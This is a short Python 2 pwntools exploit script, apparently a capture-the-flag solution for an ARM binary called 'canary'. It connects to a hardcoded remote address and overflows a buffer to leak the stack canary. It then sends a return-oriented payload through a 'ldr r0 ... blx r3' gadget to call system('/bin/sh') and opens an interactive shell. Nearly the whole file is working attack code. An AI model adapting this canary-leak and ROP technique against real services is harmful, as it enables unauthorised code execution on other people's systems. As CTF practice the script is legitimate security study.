#!/usr/bin/env python2
from pwn import *
#r = remote('localhost', 4000)
r = remote('116.203.30.62', 18113)
context.binary = './canary'
sh = next(context.binary.search('/bin/sh\0'))
print hex(sh)

raw_input('#')



r.sendafter('> ', 'a'*(0x2c-4+1))
r.recvuntil('a'*(0x2c-4+1))

canary = u32('\x00'+r.recvn(3))
system = 0x16d90
gadget = 0x5b148 #0x0005b148 : ldr r0, [sp, #0x14] ; ldr r3, [sp, #0x10] ; blx r3


print 'canary:', hex(canary)

r.sendafter('> ', 'a'*(0x2c-4)+p32(canary)+'\x00'*(0x34-0x2c+4)+p32(gadget)+'a'*0x10+p32(system)+p32(sh))

r.interactive()

